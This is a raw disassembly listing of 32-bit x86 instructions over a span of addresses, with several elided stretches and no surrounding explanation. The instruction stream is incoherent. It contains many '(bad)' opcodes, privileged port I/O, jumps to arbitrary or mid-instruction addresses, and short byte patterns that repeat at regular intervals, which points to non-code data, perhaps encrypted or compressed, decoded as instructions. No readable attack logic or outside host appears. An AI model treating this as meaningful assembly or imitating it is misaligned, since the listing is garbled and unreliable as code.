  42cb67:	ja     0x42cb6f
  42cb69:	xor    dl,BYTE PTR [ecx]
  42cb6b:	js     0x42cb24
  42cb6d:	jns    0x42cb55
  42cb6f:	xor    DWORD PTR [esi-0x16622471],edx
  42cb75:	cmc    
  42cb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb78:	pop    ecx
  42cb79:	aam    0x8f
  42cb7b:	outs   dx,BYTE PTR ds:[esi]
  42cb7c:	xchg   ecx,eax
  42cb7d:	retf   0xeb0d
  42cb80:	imul   eax,DWORD PTR [ecx],0x1e
  42cb83:	leave  
  42cb84:	enter  0xd1cb,0x5c
  42cb88:	in     eax,dx
  42cb89:	iret   
  42cb8a:	shr    BYTE PTR [edi+0x39],cl
  42cb8d:	mov    eax,0x423d0bb7
  42cb92:	out    0xfe,eax
  42cb94:	(bad)  
  42cb95:	jge    0x42cb1c
  42cb97:	div    BYTE PTR [edi-0x25]
  42cb9a:	arpl   di,bx
  42cb9c:	int3   
  42cb9d:	out    dx,eax
  42cb9e:	xchg   BYTE PTR [ecx],dh
  42cba0:	(bad)  
  42cba1:	adc    DWORD PTR [edi+0x39118959],ecx
  42cba7:	fisub  DWORD PTR [ebx+0x40]
  42cbaa:	loopne 0x42cb4a
  42cbac:	jns    0x42cbcf
  42cbae:	pop    esi
  42cbaf:	mov    ds:0x5e86976d,eax
  42cbb4:	jb     0x42cbb6
	...
  42cc16:	jg     0x42cc1a
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	jle    0x42cc7e
  42cc24:	fist   DWORD PTR [esp+ebp*1]
  42cc27:	fild   WORD PTR [ecx]
  42cc29:	add    BYTE PTR [edi],al
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [ecx+eiz*8-0x27e6ecd8],ch
  42cc34:	repz mov ch,0x10
  42cc37:	jmp    0x42cc95
  42cc39:	js     0x42cbf7
  42cc3b:	or     esi,DWORD PTR [edi+0x747a13a8]
  42cc41:	mov    esi,edx
  42cc43:	sub    eax,0x3bd884f5
  42cc48:	lock leave 
  42cc4a:	push   0x51
  42cc4c:	adc    BYTE PTR [esi+0x28],ah
  42cc4f:	jmp    0x42cc27
  42cc51:	setb   cl
  42cc54:	jl     0x42cc75
  42cc56:	dec    edx
  42cc57:	loopne 0x42cc3d
  42cc59:	sub    eax,eax
  42cc5b:	push   eax
  42cc5c:	cmc    
  42cc5d:	mov    eax,0xc0d99615
  42cc62:	mov    bl,0x71
  42cc64:	or     esi,edx
  42cc66:	dec    esi
  42cc67:	cld    
  42cc68:	mov    esi,0xc9c1ec60
  42cc6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc6e:	xchg   edx,eax
  42cc6f:	loopne 0x42cc3b
  42cc71:	mov    cl,0xdc
  42cc73:	sbb    bl,BYTE PTR [eax+0x455b8cc9]
  42cc79:	mov    ebp,0xbf28115a
  42cc7e:	cmp    BYTE PTR [edx-0x1b1606a8],dh
  42cc84:	cmp    BYTE PTR [esi-0x2446db9],0x1
  42cc8b:	ss jmp 0xb96d92ed
  42cc91:	push   esp
  42cc92:	push   edx
  42cc93:	js     0x42cc27
  42cc95:	dec    ebx
  42cc96:	add    al,0xaf
  42cc98:	(bad)  
  42cc9a:	repnz mov bh,0x27
  42cc9d:	adc    BYTE PTR [ecx-0x8],dl
  42cca0:	ins    BYTE PTR es:[edi],dx
  42cca1:	jp     0x42ccee
  42cca3:	fidiv  DWORD PTR [esi+0x48c2b07e]
  42cca9:	jbe    0x42cccc
  42ccab:	aas    
  42ccac:	mov    ch,0x69
  42ccae:	cld    
  42ccaf:	test   ebp,ebp
  42ccb1:	lahf   
  42ccb2:	jmp    0x4d6e:0xd176a9df
  42ccb9:	loop   0x42ccdb
  42ccbb:	or     eax,edx
  42ccbd:	in     eax,dx
  42ccbe:	push   0xc5ec16b4
  42ccc3:	ds adc al,0xe1
  42ccc6:	mov    DWORD PTR [ecx+0x4e],ebp
  42ccc9:	pop    es
  42ccca:	and    DWORD PTR [ebp-0x448920de],eax
  42ccd0:	or     eax,0x9cd63f88
  42ccd5:	xlat   BYTE PTR ds:[ebx]
  42ccd6:	cmp    edx,DWORD PTR [ecx]
  42ccd8:	sar    BYTE PTR [eax+ebp*1],cl
  42ccdb:	cmp    ebx,DWORD PTR [ebx]
  42ccdd:	add    BYTE PTR [esi+edx*2],dl
  42cce0:	pusha  
  42cce1:	pop    es
  42cce2:	mov    cl,0xae
  42cce4:	jmp    0x9da52154
  42cce9:	sub    DWORD PTR ds:0xfed76b8b,eax
  42ccef:	mov    eax,0x28067ca6
  42ccf4:	addr16 cli 
  42ccf6:	inc    edi
  42ccf7:	retf   
  42ccf8:	xchg   ebx,eax
  42ccf9:	sbb    al,0x26
  42ccfb:	pop    ebx
  42ccfc:	fidivr WORD PTR [edx]
  42ccfe:	and    eax,0x9cca5170
  42cd03:	enter  0x1dbf,0x68
  42cd07:	jae    0x42cd31
  42cd09:	mov    ecx,0xd802c792
  42cd0e:	xchg   esi,eax
  42cd0f:	out    dx,eax
  42cd10:	int    0x65
  42cd12:	mov    WORD PTR [esi-0x4a],cs
  42cd15:	js     0x42cd2c
  42cd17:	mov    edx,0xd71cd536
  42cd1c:	sub    BYTE PTR [eax],0x71
  42cd1f:	ins    DWORD PTR es:[edi],dx
  42cd20:	xor    eax,0x51e599d6
  42cd25:	xchg   cl,dl
  42cd27:	mov    esi,0x947991bc
  42cd2c:	adc    al,bh
  42cd2e:	aam    0x99
  42cd30:	cmp    edx,ecx
  42cd32:	in     eax,dx
  42cd33:	fcmovb st,st(0)
	...
  42cd95:	add    BYTE PTR [ecx],bl
  42cd97:	mov    eax,ds:0xdffe87fe
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	popf   
  42cda3:	out    0x7c,al
  42cda5:	adc    DWORD PTR [ebx],esi
  42cda7:	loopne 0x42cdaa
  42cda9:	add    BYTE PTR [edi],al
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [edi],ch
  42cdaf:	or     eax,ecx
  42cdb1:	mov    esi,0x2f49ddc3
  42cdb6:	mov    ebp,0xd5bf67e6
  42cdbb:	jbe    0x42cdbf
  42cdbd:	jp     0x42cda6
  42cdbf:	or     BYTE PTR [esi-0x59],ch
  42cdc2:	dec    esp
  42cdc3:	push   ds
  42cdc4:	mov    cl,0xdf
  42cdc6:	lahf   
  42cdc7:	inc    ebp
  42cdc8:	in     eax,0x58
  42cdca:	pop    ss
  42cdcb:	js     0x42ce44
  42cdcd:	adc    edi,DWORD PTR [edi+edi*8-0x6a]
  42cdd1:	fiadd  WORD PTR [ecx]
  42cdd3:	push   es
  42cdd4:	out    0x15,eax
  42cdd6:	retf   
  42cdd7:	ins    BYTE PTR es:[edi],dx
  42cdd8:	aas    
  42cdd9:	push   esi
  42cdda:	xor    BYTE PTR [esi],0x58
  42cddd:	fsubr  st(2),st
  42cddf:	mov    ds:0x2ec6ea5d,eax
  42cde4:	sbb    BYTE PTR [ecx+0x36],cl
  42cde7:	mov    al,BYTE PTR [esi+0x5e]
  42cdea:	shl    DWORD PTR [ebp+0x0],1
  42cded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cdee:	or     edi,DWORD PTR [ebp+0x40]
  42cdf1:	sub    al,0xe9
  42cdf3:	cdq    
  42cdf4:	push   ss
  42cdf5:	in     al,0x1c
  42cdf7:	mov    eax,0xbead6d96
  42cdfc:	cdq    
  42cdfd:	inc    edi
  42cdfe:	in     eax,dx
  42cdff:	xlat   BYTE PTR ds:[ebx]
  42ce00:	arpl   WORD PTR [ebx-0x2d86974d],cx
  42ce06:	repz div DWORD PTR [esi-0x4c]
  42ce0a:	cmp    eax,0xaddc9ae7
  42ce0f:	leave  
  42ce10:	in     al,dx
  42ce11:	addr16 cld 
  42ce13:	dec    ebx
  42ce14:	sar    DWORD PTR [ebx+0x73],0xed
  42ce18:	mov    edi,0xfd054948
  42ce1d:	mov    bh,0x49
  42ce1f:	cmp    DWORD PTR [edx-0x13dfffe9],edx
  42ce25:	xchg   al,dh
  42ce27:	fwait
  42ce28:	cmc    
  42ce29:	mul    BYTE PTR [ecx-0x4e]
  42ce2c:	pop    esi
  42ce2d:	mul    BYTE PTR [esi+0x55b96fbf]
  42ce33:	mov    bh,0xef
  42ce35:	xor    edx,ecx
  42ce37:	out    0xe2,al
  42ce39:	cmp    eax,0x7a30df68
  42ce3e:	shl    BYTE PTR [esi-0x4e],1
  42ce41:	js     0x42ce31
  42ce43:	test   al,0x5f
  42ce45:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42ce47:	psubw  mm7,mm2
  42ce4a:	inc    eax
  42ce4b:	mov    ebp,0xdd7cd992
  42ce50:	jno    0x42ce25
  42ce52:	mov    cl,0x29
  42ce54:	outs   dx,DWORD PTR ds:[esi]
  42ce55:	push   eax
  42ce56:	mov    BYTE PTR [edx-0x9c052ba],cl
  42ce5c:	clc    
  42ce5d:	shr    DWORD PTR [ecx],cl
  42ce5f:	xchg   edi,eax
  42ce60:	jae    0x42ce65
  42ce62:	jo     0x42ce40
  42ce64:	fld    DWORD PTR [esi+ebx*4+0x8068951]
  42ce6b:	aam    0xa
  42ce6d:	push   cs
  42ce6e:	jg     0x42ce96
  42ce70:	inc    esp
  42ce71:	test   eax,0xd76184ea
  42ce76:	adc    dh,al
  42ce78:	test   al,ah
  42ce7a:	setne  ch
  42ce7d:	ficomp DWORD PTR [ecx-0x12]
  42ce80:	xor    eax,esp
  42ce82:	ins    BYTE PTR es:[edi],dx
  42ce83:	ret    0xba39
  42ce86:	pop    eax
  42ce87:	call   0xf886c394
  42ce8c:	js     0x42ce7f
  42ce8e:	sub    dl,BYTE PTR [edi-0x5d]
  42ce91:	and    eax,0xebcbe8e1
  42ce96:	or     edx,DWORD PTR [edx]
  42ce98:	outs   dx,BYTE PTR ds:[esi]
  42ce99:	imul   esp,DWORD PTR [esi-0x66],0xc2597a6a
  42cea0:	lock pop ds
  42cea2:	mov    bl,0x50
  42cea4:	shl    DWORD PTR ds:0xa226835f,1
  42ceaa:	and    esi,ebp
  42ceac:	arpl   sp,dx
  42ceae:	inc    esi
  42ceaf:	pop    edx
  42ceb0:	mov    al,0xdb
  42ceb2:	scas   al,BYTE PTR es:[edi]
  42ceb3:	in     al,dx
  42ceb4:	add    BYTE PTR gs:[eax],al
	...
  42cf13:	add    BYTE PTR [eax],al
  42cf15:	add    BYTE PTR [ebx+0x3d],dh
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx+0x4e782d11]
  42cf24:	dec    ebp
  42cf25:	idiv   BYTE PTR [edx]
  42cf27:	loope  0x42cf2a
  42cf29:	add    BYTE PTR [edi],al
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    BYTE PTR [ebp+0x3a010184],cl
  42cf33:	es cli 
  42cf35:	cmp    cl,BYTE PTR [edx+0x7890d26a]
  42cf3b:	mov    ds:0x990e57a9,al
  42cf40:	xchg   BYTE PTR [ebx],bl
  42cf42:	xor    ah,BYTE PTR ds:[ebp+0x58fc0d79]
  42cf49:	cld    
  42cf4a:	push   es
  42cf4b:	xor    al,0xd9
  42cf4d:	dec    edx
  42cf4e:	bound  ebp,QWORD PTR [ebx-0xa]
  42cf51:	and    al,0x66
  42cf53:	xchg   edi,eax
  42cf54:	mov    BYTE PTR [ebp+0x7c9d0c9a],dl
  42cf5a:	and    DWORD PTR [ecx],ecx
  42cf5c:	ret    
  42cf5d:	in     eax,dx
  42cf5e:	pop    ebp
  42cf5f:	xor    eax,0xfdcaf8b3
  42cf64:	cmp    al,0x9e
  42cf66:	xor    ecx,DWORD PTR [ebx+0x5c868570]
  42cf6c:	inc    eax
  42cf6d:	inc    ebx
  42cf6e:	cmp    DWORD PTR [eax+0x262a2278],ebx
  42cf74:	dec    edi
  42cf75:	push   esi
  42cf76:	pop    ebp
  42cf77:	pusha  
  42cf78:	sbb    ebx,DWORD PTR [edx+eiz*4]
  42cf7b:	lds    ecx,FWORD PTR [esi+eax*2+0x37]
  42cf7f:	or     BYTE PTR [edi+0x2a],al
  42cf82:	pusha  
  42cf83:	adc    eax,0x67e88eaf
  42cf88:	fwait
  42cf89:	xchg   esi,eax
  42cf8a:	xchg   esi,eax
  42cf8b:	dec    eax
  42cf8c:	leave  
  42cf8d:	into   
  42cf8e:	mov    ds:0x9b0ae54c,eax
  42cf93:	into   
  42cf94:	pop    ecx
  42cf95:	cwde   
  42cf96:	push   esp
  42cf97:	mov    bl,0xf3
  42cf99:	loop   0x42cfe9
  42cf9b:	sti    
  42cf9c:	add    al,0x39
  42cf9e:	jnp    0x42cfd5
  42cfa0:	outs   dx,BYTE PTR ds:[esi]
  42cfa1:	jecxz  0x42cff4
  42cfa3:	jmp    0x42cfb4
  42cfa5:	adc    DWORD PTR [ecx],edi
  42cfa7:	popf   
  42cfa8:	shr    cl,cl
  42cfaa:	add    ebp,DWORD PTR [esi]
  42cfac:	(bad)  
  42cfb0:	dec    esi
  42cfb1:	push   edi
  42cfb2:	adc    al,0x60
  42cfb4:	ror    BYTE PTR [edx-0x607d5522],0x44
  42cfbb:	pop    ebx
  42cfbc:	sub    dh,BYTE PTR [eax-0x66]
  42cfbf:	std    
  42cfc0:	mov    al,0x0
  42cfc2:	lods   eax,DWORD PTR ds:[esi]
  42cfc3:	ja     0x42d005
  42cfc5:	or     ebp,DWORD PTR [edi-0xf]
  42cfc8:	mov    ecx,0x139b7078
  42cfcd:	cwde   
  42cfce:	lea    ebx,[ecx+0x2b5419c8]
  42cfd4:	mov    eax,ds:0x171f4309
  42cfd9:	or     DWORD PTR [edx+ebx*4-0x46add233],ebx
  42cfe0:	or     DWORD PTR [edx-0x23],ebx
  42cfe3:	sbb    bh,al
  42cfe5:	pop    ecx
  42cfe6:	into   
  42cfe7:	xchg   edx,eax
  42cfe8:	inc    dh
  42cfea:	inc    edx
  42cfeb:	jg     0x42cfd7
  42cfed:	addr16 or eax,0xdbd6264e
  42cff3:	sub    cl,BYTE PTR [edx+0x5599b567]
  42cff9:	ror    DWORD PTR [ebp+0x1589a8a4],1
  42cfff:	pop    ss
  42d000:	out    dx,al
  42d001:	cmp    ecx,ecx
  42d003:	sbb    eax,0x6def1126
  42d008:	mov    cl,0x17
  42d00a:	sub    eax,0xec438930
  42d00f:	imul   ecx,DWORD PTR [edx],0xbdace17f
  42d015:	mov    edx,0x152a77f7
  42d01a:	adc    eax,0xb1cf06ec
  42d01f:	gs dec ecx
  42d021:	int3   
  42d022:	rol    ebp,0x33
  42d025:	inc    ecx
  42d026:	xchg   edi,eax
  42d027:	dec    DWORD PTR [edi]
  42d029:	mov    ebp,0x1b60db74
  42d02e:	sub    BYTE PTR [esi],al
  42d030:	jp     0x42cfe4
  42d032:	inc    esp
  42d033:	fcomp  QWORD PTR [eax]
	...
  42d095:	add    BYTE PTR [eax+0x3a],dl
  42d098:	(bad)  
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	pop    edx
  42d0a3:	pop    esi
  42d0a4:	sbb    al,0x83
  42d0a6:	inc    ecx
  42d0a7:	loop   0x42d0aa
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [edi+0xe],dh
  42d0b0:	popa   
  42d0b1:	mov    ah,0xe1
  42d0b3:	mov    ah,0xbd
  42d0b5:	ffreep st(0)
  42d0b7:	xchg   DWORD PTR [ebx],ecx
  42d0b9:	pop    esi
  42d0ba:	add    eax,0x84bbbea6
  42d0bf:	jmp    0x42d06d
  42d0c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0c2:	pop    esp
  42d0c3:	mov    eax,DWORD PTR [ebx+0x2b]
  42d0c6:	std    
  42d0c7:	mov    al,ds:0x3a237f3c
  42d0cc:	(bad)  
  42d0ce:	shl    esi,0x3f
  42d0d1:	pop    ss
  42d0d2:	(bad)  
  42d0d4:	cld    
  42d0d5:	mov    ah,0x60
  42d0d7:	les    esi,FWORD PTR [ebp+0x768a2d84]
  42d0dd:	fucomp st(1)
  42d0df:	cmp    bl,BYTE PTR [ecx+eax*1]
  42d0e2:	mov    ecx,0x8d89c829
  42d0e7:	add    bh,BYTE PTR [edx-0x55]
  42d0ea:	cmc    
  42d0eb:	dec    edx
  42d0ec:	mov    ch,0x38
  42d0ee:	enter  0x1cd9,0xaf
  42d0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0f3:	out    dx,eax
  42d0f4:	cmc    
  42d0f5:	sub    eax,0xf2bb76b5
  42d0fa:	ins    BYTE PTR es:[edi],dx
  42d0fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d0fc:	(bad)  
  42d0fd:	fdivr  QWORD PTR [esi]
  42d0ff:	adc    DWORD PTR [ebp-0x6d],0x5e0d42c6
  42d106:	daa    
  42d107:	cmp    al,0xf0
  42d109:	fisubr WORD PTR [esi-0x6db2d165]
  42d10f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d110:	jmp    0x2dd154e8
  42d115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d116:	in     eax,0xe0
  42d118:	inc    edi
  42d119:	or     BYTE PTR [ecx+0x369c1579],dh
  42d11f:	test   DWORD PTR [eax+0x3b],ebp
  42d122:	stos   BYTE PTR es:[edi],al
  42d123:	ds add eax,0xbe4925fb
  42d129:	loopne 0x42d18c
  42d12b:	mov    edi,0x97657ccd
  42d130:	addr16 dec ecx
  42d132:	mov    dl,0xce
  42d134:	aas    
  42d135:	shl    DWORD PTR [ebp+0x3c2173c],cl
  42d13b:	sbb    al,0x5f
  42d13d:	pop    ds
  42d13e:	adc    ecx,DWORD PTR [eax]
  42d140:	dec    esi
  42d141:	rol    edi,1
  42d143:	sub    dh,dl
  42d145:	dec    edi
  42d146:	dec    esi
  42d147:	pusha  
  42d148:	fnstsw WORD PTR [ecx-0x55]
  42d14b:	xor    DWORD PTR ds:0xdc69e742,eax
  42d151:	inc    ebp
  42d152:	fisub  WORD PTR [ecx]
  42d154:	adc    eax,0x927053a2
  42d159:	xor    al,0x5c
  42d15b:	sbb    DWORD PTR [esi+eax*8-0x56974aa7],edi
  42d162:	in     eax,dx
  42d163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d164:	xor    cl,BYTE PTR [esi+0x544f254e]
  42d16a:	into   
  42d16b:	lahf   
  42d16c:	(bad)  
  42d16d:	push   ebp
  42d16e:	adc    al,BYTE PTR [ecx+0xe91fae7]
  42d174:	and    bl,bl
  42d176:	in     eax,0x96
  42d178:	xor    eax,0xd72d7734
  42d17d:	(bad)  
  42d17e:	aas    
  42d17f:	jecxz  0x42d15e
  42d181:	out    dx,al
  42d182:	dec    eax
  42d183:	je     0x42d1a3
  42d185:	adc    dl,BYTE PTR [esi+0x40b33398]
  42d18b:	pop    ecx
  42d18c:	fs das 
  42d18e:	jmp    DWORD PTR [esi+0x52e5ba79]
  42d194:	out    dx,eax
  42d195:	clc    
  42d196:	cdq    
  42d197:	std    
  42d198:	les    esi,FWORD PTR [eax-0x5026cabd]
  42d19e:	ror    DWORD PTR [eax],cl
  42d1a0:	addr16 pop es
  42d1a2:	lods   al,BYTE PTR ds:[esi]
  42d1a3:	mov    esp,DWORD PTR [ebx+edx*2-0x342f4023]
  42d1aa:	rcl    BYTE PTR ds:0x64a6c0ef,1
  42d1b0:	jle    0x42d157
  42d1b2:	dec    ecx
  42d1b3:	mov    ah,0xd1
	...
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	sub    esi,DWORD PTR [edx]
  42d224:	mov    bl,0xb0
  42d226:	dec    eax
  42d227:	jecxz  0x42d22a
  42d229:	add    BYTE PTR [edi],al
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    BYTE PTR [ebp-0x56],cl
  42d230:	scas   eax,DWORD PTR es:[edi]
  42d231:	aaa    
  42d232:	inc    edi
  42d233:	mov    ecx,0xaf3a0b53
  42d238:	dec    ebx
  42d239:	dec    esi
  42d23a:	mov    eax,0xa0fe0c6c
  42d23f:	xchg   ebx,eax
  42d240:	cmp    DWORD PTR [ebp+0x2e],esi
  42d243:	scas   al,BYTE PTR es:[edi]
  42d244:	mov    ah,0xb3
  42d246:	mov    al,0x1f
  42d248:	fist   WORD PTR [ebx+0x1a]
  42d24b:	inc    esp
  42d24c:	data16 ja 0x42d251
  42d24f:	(bad)  
  42d250:	fcom   DWORD PTR [edi+0x6e]
  42d253:	nop
  42d254:	xor    edi,DWORD PTR [edi]
  42d256:	jae    0x42d1e5
  42d258:	mov    esi,0x7f0db7ce
  42d25d:	jge    0x42d27e
  42d25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d260:	dec    edi
  42d261:	inc    esp
  42d262:	loopne 0x42d2cf
  42d264:	add    eax,0x9d6d1656
  42d269:	or     al,0x42
  42d26b:	sub    al,BYTE PTR [esi]
  42d26d:	int    0xf0
  42d26f:	push   esp
  42d270:	bound  ebx,QWORD PTR [edx+0x6abc078e]
  42d276:	and    dl,ah
  42d278:	out    dx,al
  42d279:	in     al,dx
  42d27a:	retf   
  42d27b:	add    ah,BYTE PTR ds:0x85c96b9d
  42d281:	out    dx,al
  42d282:	push   0x5edccbe3
  42d287:	push   0x22
  42d289:	popa   
  42d28a:	push   ebp
  42d28b:	xlat   BYTE PTR ds:[ebx]
  42d28c:	cwde   
  42d28d:	lock out 0x8f,al
  42d290:	mov    esp,ecx
  42d292:	popf   
  42d293:	mov    esp,DWORD PTR [eax-0x1d]
  42d296:	and    eax,0x1cc29405
  42d29b:	pop    cx
  42d29d:	inc    ebx
  42d29e:	stos   DWORD PTR es:[edi],eax
  42d29f:	iret   
  42d2a0:	push   edi
  42d2a1:	ret    0x7b64
  42d2a4:	mov    WORD PTR [ebp+ecx*4-0x7753690e],fs
  42d2ab:	mov    dh,BYTE PTR [ecx]
  42d2ad:	sbb    ecx,eax
  42d2af:	adc    BYTE PTR [edi+0x54],0x69
  42d2b3:	in     eax,0xde
  42d2b5:	addr16 test edx,0x88dbd683
  42d2bc:	rcl    BYTE PTR [ebp+0x627339f6],0xe3
  42d2c3:	adc    esi,edx
  42d2c5:	jne    0x42d2bf
  42d2c7:	xor    edx,ecx
  42d2c9:	mov    ebx,0x77e4651a
  42d2ce:	or     al,0xe7
  42d2d0:	out    0x35,eax
  42d2d2:	jb     0x42d27e
  42d2d4:	addr16 jnp 0x42d274
  42d2d7:	dec    edi
  42d2d8:	(bad)  
  42d2d9:	arpl   di,ax
  42d2db:	std    
  42d2dc:	aam    0xa4
  42d2de:	dec    esp
  42d2df:	stc    
  42d2e0:	mov    dl,0x30
  42d2e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2e3:	iret   
  42d2e4:	pop    es
  42d2e5:	test   al,0x22
  42d2e7:	aam    0x5d
  42d2e9:	add    DWORD PTR [ebp-0x28],ebp
  42d2ec:	bound  ecx,QWORD PTR [ebp-0x49]
  42d2ef:	adc    esi,DWORD PTR [esi+eax*4-0x9f716ab]
  42d2f6:	test   BYTE PTR [ecx-0x6cdbca60],dl
  42d2fc:	jecxz  0x42d34b
  42d2fe:	mov    esp,0xb648adff
  42d303:	in     eax,0xcf
  42d305:	xchg   edi,eax
  42d306:	sbb    eax,0xcdaa749
  42d30b:	js     0x42d334
  42d30d:	stos   DWORD PTR es:[edi],eax
  42d30e:	fsubr  QWORD PTR [ebx+ebp*4]
  42d311:	cdq    
  42d312:	inc    esi
  42d313:	call   0x47ee7b3c
  42d318:	sub    al,BYTE PTR [edi]
  42d31a:	jmp    0xf8ef:0x3c228976
  42d321:	mov    ch,0xa9
  42d323:	test   ch,al
  42d325:	mov    eax,0x5511ce72
  42d32a:	mov    edi,0x6600142f
  42d32f:	(bad)  
  42d331:	add    ebx,DWORD PTR [esp+eiz*8]
  42d334:	lea    eax,[eax]
	...
  42d396:	ror    esi,0x63
  42d399:	cdq    
  42d39a:	outs   dx,DWORD PTR ds:[esi]
  42d39b:	mov    ebp,0x9c38defb
  42d3a0:	int3   
  42d3a1:	pop    eax
  42d3a2:	or     eax,0x4fcfb579
  42d3a7:	in     al,0x1
  42d3a9:	add    BYTE PTR [edi],al
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    BYTE PTR [ebx+esi*2],dh
  42d3b0:	fucomp st(6)
  42d3b2:	jae    0x42d359
  42d3b4:	out    0xe3,al
  42d3b6:	sahf   
  42d3b7:	xchg   DWORD PTR [ebp+eax*2+0x2e],esi
  42d3bb:	jne    0x42d3df
  42d3bd:	sbb    ebx,DWORD PTR [ebx+0x68]
  42d3c0:	popf   
  42d3c1:	ja     0x42d368
  42d3c3:	cmp    eax,DWORD PTR [eax-0x1cca1f2c]
  42d3c9:	xchg   esi,eax
  42d3ca:	pop    ecx
  42d3cb:	addr16 (bad) 
  42d3cd:	jmp    DWORD PTR [ecx-0x5c]
  42d3d0:	or     al,0xaa
  42d3d2:	loop   0x42d395
  42d3d4:	out    dx,eax
  42d3d5:	(bad)  
  42d3d6:	(bad)  
  42d3d7:	aad    0x37
  42d3d9:	add    BYTE PTR [ebx+0x5c],0x47
  42d3dd:	ins    DWORD PTR es:[edi],dx
  42d3de:	loope  0x42d398
  42d3e0:	pop    edx
  42d3e1:	out    dx,eax
  42d3e2:	popa   
  42d3e3:	adc    BYTE PTR [eax-0x1e03c4e1],bh
  42d3e9:	push   esi
  42d3ea:	sub    al,0xb4
  42d3ec:	add    BYTE PTR [edx],dh
  42d3ee:	cli    
  42d3ef:	daa    
  42d3f0:	imul   esp,edi,0xca937ed7
  42d3f6:	jns    0x42d3dd
  42d3f8:	fwait
  42d3f9:	aad    0xfa
  42d3fb:	test   al,0xcf
  42d3fd:	jp     0x42d462
  42d3ff:	(bad)  
  42d400:	xchg   esp,eax
  42d401:	mov    ds:0x1d6db3c6,al
  42d406:	cmp    al,0x79
  42d408:	jge    0x42d3a2
  42d40a:	push   ebx
  42d40b:	cwde   
  42d40c:	xlat   BYTE PTR ds:[ebx]
  42d40d:	and    DWORD PTR [ebx-0x9812443],0x8c038cb5
  42d417:	xchg   BYTE PTR [eax+0x18],dl
  42d41a:	repnz add DWORD PTR [edi-0x14031497],ebp
  42d421:	pop    ss
  42d422:	pop    es
  42d423:	(bad)  
  42d424:	popa   
  42d425:	adc    edi,ebx
  42d427:	daa    
  42d428:	mov    bl,0xa1
  42d42a:	xor    dh,BYTE PTR [ebp-0x71ce42a2]
  42d430:	sub    DWORD PTR [edx+0x19],eax
  42d433:	in     eax,dx
  42d434:	lods   eax,DWORD PTR ds:[esi]
  42d435:	sbb    eax,0x3645a820
  42d43a:	jmp    0x42d489
  42d43c:	mov    cl,BYTE PTR [edi-0x29]
  42d43f:	call   0xa75dcb0f
  42d444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d445:	test   BYTE PTR [ebp+0x11],0x3f
  42d449:	cmp    dl,BYTE PTR [ebx+ebx*2+0x76]
  42d44d:	sbb    ecx,ebp
  42d44f:	jg     0x42d460
  42d451:	icebp  
  42d452:	lods   al,BYTE PTR ds:[esi]
  42d453:	xchg   BYTE PTR [ebp+0x6a0a486b],cl
  42d459:	dec    ecx
  42d45a:	adc    ebx,eax
  42d45c:	push   ecx
  42d45d:	xor    eax,ecx
  42d45f:	mov    BYTE PTR [edx],bl
  42d461:	loop   0x42d4a5
  42d463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d464:	cli    
  42d465:	inc    eax
  42d466:	xchg   edx,eax
  42d467:	pop    esp
  42d468:	inc    edi
  42d469:	stos   DWORD PTR es:[edi],eax
  42d46a:	sbb    BYTE PTR [eax-0x4c38ea4f],cl
  42d470:	add    al,0x7d
  42d472:	push   ebx
  42d473:	repz xchg edx,eax
  42d475:	cmp    eax,0xe2f4ff7c
  42d47a:	leave  
  42d47b:	ins    DWORD PTR es:[edi],dx
  42d47c:	ror    BYTE PTR [ecx],0x47
  42d47f:	push   ds
  42d480:	mov    DWORD PTR [ebp+0x49c31438],edx
  42d486:	adc    edi,ebp
  42d488:	out    dx,al
  42d489:	adc    al,dh
  42d48b:	mov    eax,0x1fb831f0
  42d490:	ins    BYTE PTR es:[edi],dx
  42d491:	pop    edx
  42d492:	not    DWORD PTR [edx+0x38]
  42d495:	mov    DWORD PTR [ebp+esi*4-0x362de72f],eax
  42d49c:	popf   
  42d49d:	loope  0x42d4fa
  42d49f:	push   0xffffff91
  42d4a1:	loope  0x42d473
  42d4a3:	gs loop 0x42d45e
  42d4a6:	and    BYTE PTR [edx],al
  42d4a8:	mov    WORD PTR [edx],fs
  42d4aa:	xchg   ebx,eax
  42d4ab:	popa   
  42d4ac:	dec    edx
  42d4ad:	sahf   
  42d4ae:	add    bl,BYTE PTR [esi+0x37]
  42d4b1:	jmp    0x1312019
	...
  42d516:	cdq    
  42d517:	cmc    
  42d518:	adc    BYTE PTR [ebx-0x12],0x77
  42d51c:	fcos   
  42d51e:	add    BYTE PTR [ebx],al
